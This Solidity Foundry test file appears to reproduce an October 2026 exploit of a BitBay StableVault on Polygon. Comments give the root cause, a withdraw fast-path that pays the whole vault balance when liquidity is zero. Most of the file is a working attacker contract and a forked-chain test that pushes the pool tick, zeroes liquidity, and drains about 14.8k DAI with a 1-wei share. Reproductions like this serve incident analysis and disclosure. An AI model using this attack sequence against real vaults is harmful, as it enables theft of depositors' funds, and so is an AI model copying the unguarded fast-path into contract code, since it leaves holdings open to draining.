// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// BitBay StableVault (UsdcDaiV4Vault) - liquidity==0 withdraw drains the whole vault to a 1-wei shareholder.
// Polygon, 2026-10-08.
//
// Run: forge test --evm-version cancun --match-test testExploit -vvv
//
// Loss (victim): 14,838.466608989135865711 DAI - the vault's ENTIRE idle DAI balance, sent to the attacker
//                by withdraw(1) through the liquidity==0 fast-path (no proportional-share cap).
// Attacker realized profit on-chain: 14,813.548248 USDC (native USDC, 6 dec) kept after repaying both flash loans
//                (the ~25 units difference vs the gross drain is the round-trip price impact of the manipulation swap).
// This reproduction keeps the profit in DAI: it drains 14,838.47 DAI and swaps its leftover USDC back to DAI, so the
// net DAI gain (final DAI - working capital) equals the drain minus the same round-trip swap cost.
//
// On-chain references (Polygon, chainId 137):
//   attack tx         : 0x5b795dc5c5e1665b712c7ccf478c1d8c59a162d698f4e0bfb40bd303e04a7ff2
//   block             : 95204942 (fork at parent 95204941), timestamp 1791512622
//   attacker EOA      : 0x59Ae3c8dd50063429D86BdaEBbC350fB64e9884B
//   attacker contract : 0xc2C6F4F7E1425bE1DCB996175Cf7852bF53c23E2
//   SlowMist alert    : https://x.com/SlowMist_Team/status/2108399198035202138
//
// Actors / contracts (all REAL, forked, not mocked except the attacker reconstruction):
//   Vault (victim, UsdcDaiV4Vault)   : 0x048E88311ca84876aeA086125825492e2AF2e5A0
//   Uniswap v4 PoolManager           : 0x67366782805870060151383F4BbFF9daB53e5cD6
//   Uniswap v4 StateView             : 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a
//   DAI  (token1 of poolKey)         : 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063
//   USDC (native, token0 of poolKey) : 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359
//   poolKey                          : {currency0: USDC, currency1: DAI, fee: 50, tickSpacing: 1, hooks: 0}
//   pool position at fork            : tickLower 276323, tickUpper 276326, current tick 276324 (in range)
//
// ROOT CAUSE (confirmed from the verified source StableVault.sol, solc 0.8.30):
//   UsdcDaiV4Vault._withdraw(shareAmount, recipient, addDust) opens with a fast-path for an empty position:
//
//       if (liquidity == 0) {
//           uint256 daiBal = DAI.balanceOf(address(this));
//           uint256 usdcBal = USDC.balanceOf(address(this));
//           if (daiBal > 0) DAI.transfer(recipient, daiBal);     // <-- WHOLE balance, no share cap
//           if (usdcBal > 0) USDC.transfer(recipient, usdcBal);
//           emit Withdrawn(recipient, shareAmount, daiBal, usdcBal);
//           return;
//       }
//
//   When the vault's Uniswap v4 liquidity is 0, this sends the vault's ENTIRE DAI+USDC balance to whoever calls
//   withdraw() - it never multiplies by shareAmount/totalShares. A holder of a single 1-wei share drains everything.
//
//   liquidity reaches 0 through reposition() -> _reposition(): it removes ALL liquidity, recomputes a fresh range
//   around the current tick, rebalances, and sets `liquidity = newLiquidity`. When the recomputed newLiquidity
//   rounds to 0 the if(newLiquidity > 0) re-add is skipped and liquidity stays 0, while the ~14.8k DAI that was
//   just pulled out of the pool sits idle in the vault. reposition() is callable by a NON-minter as long as the
//   position is OUT OF range (ct < tickLower || ct >= tickUpper), the 3-day timelock has elapsed, and liquidity != 0.
//
//   The attacker manufactures the out-of-range condition themselves by pushing the pool tick with a large swap
//   (within the vault's price-bound check), so no price/keeper precondition is externally gated.
//
// THE ATTACK (one atomic tx; this reconstruction reproduces every externally-observable step against real bytecode):
//   0. (reconstruction) obtain working-capital DAI. On-chain the attacker flash-borrowed 106,411.49 DAI from a
//      Uniswap-v3-style USDC/DAI pool (0x5645dCB6...) plus 1,453.57 DAI from Balancer, then repaid both at the end.
//      Here that funding is replaced by vm.deal of DAI to the exploit contract - the flash loans are only a funding
//      wrapper and are not part of the vulnerability.
//   1. deposit(1, deadline) -> receive 1 wei of shares.
//   2. v4 swap DAI -> USDC on poolKey to push the current tick from 276324 up to 276326, i.e. >= tickUpper, so the
//      vault position is now OUT OF range (still inside the vault's [0.995, 1.005] price bounds).
//   3. reposition(deadline) -> removes all liquidity, recomputes newLiquidity == 0 (emit Repositioned(...,0)), leaving
//      the vault's entire ~14,838.47 DAI sitting idle with liquidity == 0.
//   4. withdraw(1, deadline, false) -> liquidity==0 fast-path transfers the vault's ENTIRE DAI balance to us.
//   5. v4 swap the USDC obtained in step 2 back to DAI (unwind) and measure the net DAI gain.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)
        external returns (int256 swapDelta);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

interface IVault {
    function deposit(uint256 amount, uint256 deadline) external;
    function withdraw(uint256 shareAmount, uint256 deadline, bool addDust) external;
    function reposition(uint256 deadline) external;
    function getPosition() external view returns (int24, int24, uint128);
    function liquidity() external view returns (uint128);
    function getBalances() external view returns (uint256 daiBalance, uint256 usdcBalance);
}

interface IStateView {
    function getSlot0(bytes32 poolId)
        external view returns (uint160 sqrtPriceX96, int24 tick, uint24 protocolFee, uint24 lpFee);
}

/// @notice Reconstruction of the on-chain attacker contract 0xc2C6F4F7...23E2.
/// Reproduces the attacker's externally-observable call sequence (deposit / v4 swap / reposition / withdraw / unwind)
/// against the REAL deployed vault, PoolManager and pool. Only the flash-loan funding wrapper is replaced (by vm.deal
/// in the test); everything that touches the vulnerable vault is the real on-chain contract.
contract BitBayExploiter {
    address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063; // poolKey currency1
    address constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359; // native USDC, poolKey currency0
    address constant VAULT = 0x048E88311ca84876aeA086125825492e2AF2e5A0;
    IPoolManager constant PM = IPoolManager(0x67366782805870060151383F4BbFF9daB53e5cD6);

    // Exact sqrtPriceLimit the attacker used for the DAI->USDC tick-pushing swap (stops at tick 276326).
    uint160 constant PUSH_LIMIT = 79239942287305395081048711596759672;
    // Minimum sqrt price + 1 for the USDC->DAI unwind (no limit).
    uint160 constant MIN_SQRT_PLUS_1 = 4295128740;

    PoolKey poolKey;
    uint256 action;

    constructor() {
        poolKey = PoolKey({currency0: USDC, currency1: DAI, fee: 50, tickSpacing: 1, hooks: address(0)});
    }

    /// @notice Steps 1-2: become a 1-wei shareholder and push the pool tick out of the vault position's range.
    function deposit_and_push(uint256 deadline) external {
        IERC20(DAI).approve(VAULT, 1);
        IVault(VAULT).deposit(1, deadline);
        action = 1; // DAI -> USDC, oneForZero: pushes the tick up past tickUpper.
        PM.unlock("");
    }

    /// @notice Step 3: zero out the vault's liquidity; the pulled-out DAI now sits idle in the vault.
    function do_reposition(uint256 deadline) external {
        IVault(VAULT).reposition(deadline);
    }

    /// @notice Step 4: drain the whole vault balance through the liquidity==0 fast-path.
    function do_withdraw(uint256 deadline) external {
        IVault(VAULT).withdraw(1, deadline, false);
    }

    /// @notice Step 5: unwind the manipulation - swap all USDC back to DAI.
    function unwind() external {
        action = 2;
        PM.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(PM), "only PM");
        if (action == 1) {
            // Exact-input DAI -> USDC, capped at the attacker's price limit (stops exactly at tick 276326).
            int256 delta = PM.swap(
                poolKey,
                SwapParams({
                    zeroForOne: false,
                    amountSpecified: -int256(IERC20(DAI).balanceOf(address(this))),
                    sqrtPriceLimitX96: PUSH_LIMIT
                }),
                ""
            );
            _settle(delta);
        } else {
            // Exact-input USDC -> DAI, no price limit.
            int256 delta = PM.swap(
                poolKey,
                SwapParams({
                    zeroForOne: true,
                    amountSpecified: -int256(IERC20(USDC).balanceOf(address(this))),
                    sqrtPriceLimitX96: MIN_SQRT_PLUS_1
                }),
                ""
            );
            _settle(delta);
        }
        return "";
    }

    function _settle(int256 delta) internal {
        int128 a0 = int128(delta >> 128); // currency0 = USDC
        int128 a1 = int128(delta); // currency1 = DAI
        if (a0 < 0) {
            PM.sync(USDC);
            IERC20(USDC).transfer(address(PM), uint128(-a0));
            PM.settle();
        } else if (a0 > 0) {
            PM.take(USDC, address(this), uint128(a0));
        }
        if (a1 < 0) {
            PM.sync(DAI);
            IERC20(DAI).transfer(address(PM), uint128(-a1));
            PM.settle();
        } else if (a1 > 0) {
            PM.take(DAI, address(this), uint128(a1));
        }
    }
}

contract BitBayStableVaultExploit is BaseTestWithBalanceLog {
    address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;
    address constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address constant VAULT = 0x048E88311ca84876aeA086125825492e2AF2e5A0;
    IStateView constant SV = IStateView(0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a);

    uint256 constant ATTACK_TS = 1791512622; // block 95204942 timestamp

    // Reconstruction of the attacker's flash-borrowed working capital (106,411.49 DAI UniV3 flash + 1,453.57 DAI
    // Balancer flash on-chain). Any amount >= the DAI the push-swap consumes works; the price limit bounds the swap.
    uint256 constant WORKING_CAPITAL = 110_000e18;

    BitBayExploiter exploiter;

    function setUp() public {
        vm.createSelectFork("https://polygon.drpc.org", 95204941); // parent of the attack block
        vm.warp(ATTACK_TS); // satisfy the 3-day reposition timelock / deadlines, like the real attack block
        fundingToken = DAI;
        exploiter = new BitBayExploiter();
        attacker = address(exploiter);
    }

    function testExploit() public balanceLog {
        emit log_string("BitBay StableVault - liquidity==0 withdraw drains the whole vault to a 1-wei shareholder");

        (uint256 vaultDaiBefore, uint256 vaultUsdcBefore) = IVault(VAULT).getBalances();
        (int24 tl, int24 tu, uint128 liqBefore) = IVault(VAULT).getPosition();
        (, int24 tickBefore,,) = SV.getSlot0(keccak256(abi.encode(_poolKey())));
        emit log_named_int("vault tickLower", tl);
        emit log_named_int("vault tickUpper", tu);
        emit log_named_int("pool tick before", tickBefore);
        emit log_named_decimal_uint("vault DAI before", vaultDaiBefore, 18);

        // Fund the reconstruction's working capital (replaces the two on-chain flash loans).
        deal(DAI, address(exploiter), WORKING_CAPITAL);

        // Steps 1-2: deposit 1 wei, then push the tick out of the vault position's range.
        exploiter.deposit_and_push(ATTACK_TS);
        (, int24 tickAfterPush,,) = SV.getSlot0(keccak256(abi.encode(_poolKey())));
        emit log_named_int("pool tick after push swap", tickAfterPush);

        // Step 3: reposition -> newLiquidity rounds to 0, whole position pulled into the vault's idle balance.
        exploiter.do_reposition(ATTACK_TS);
        uint128 liqAfter = IVault(VAULT).liquidity();
        (uint256 vaultDaiIdle,) = IVault(VAULT).getBalances();
        emit log_named_uint("vault liquidity after reposition", liqAfter);
        emit log_named_decimal_uint("vault DAI idle after reposition (now drainable)", vaultDaiIdle, 18);

        // Step 4: withdraw(1) drains the whole idle balance via the liquidity==0 fast-path.
        uint256 daiBeforeWithdraw = IERC20(DAI).balanceOf(address(exploiter));
        exploiter.do_withdraw(ATTACK_TS);
        uint256 drained = IERC20(DAI).balanceOf(address(exploiter)) - daiBeforeWithdraw;
        (uint256 vaultDaiAfter,) = IVault(VAULT).getBalances();
        emit log_named_decimal_uint("DAI drained by withdraw(1)", drained, 18);
        emit log_named_decimal_uint("vault DAI after withdraw", vaultDaiAfter, 18);

        // Step 5: unwind the manipulation USDC back to DAI.
        exploiter.unwind();

        uint256 finalDai = IERC20(DAI).balanceOf(address(exploiter));
        uint256 profit = finalDai - WORKING_CAPITAL;
        emit log_named_decimal_uint("Net DAI profit (final DAI - working capital)", profit, 18);

        // Invariants that prove the vulnerability fired exactly as on-chain:
        assertEq(liqBefore > 0, true, "precondition: vault had live liquidity");
        assertGt(tickAfterPush, tu - 1, "push swap must move the tick to >= tickUpper (out of range)");
        assertEq(liqAfter, 0, "reposition must leave liquidity == 0");
        assertEq(vaultDaiAfter, 0, "withdraw must drain the vault DAI to zero");
        assertGt(drained, 14_000e18, "withdraw(1) must drain the whole vault position (~14.8k DAI)");

        // Net realized profit in DAI (whole-vault drain minus the round-trip price impact of the manipulation swap).
        // Exact figure observed in this reproduction against the forked pre-state (on-chain: 14,838.47 DAI gross
        // vault loss / 14,813.55 USDC net to the attacker EOA).
        assertApproxEqRel(
            profit, 14_824_576943690080233925, 0.01e18, "net DAI profit must match the ~14.8k DAI vault drain"
        );
    }

    function _poolKey() internal pure returns (PoolKey memory) {
        return PoolKey({currency0: USDC, currency1: DAI, fee: 50, tickSpacing: 1, hooks: address(0)});
    }
}
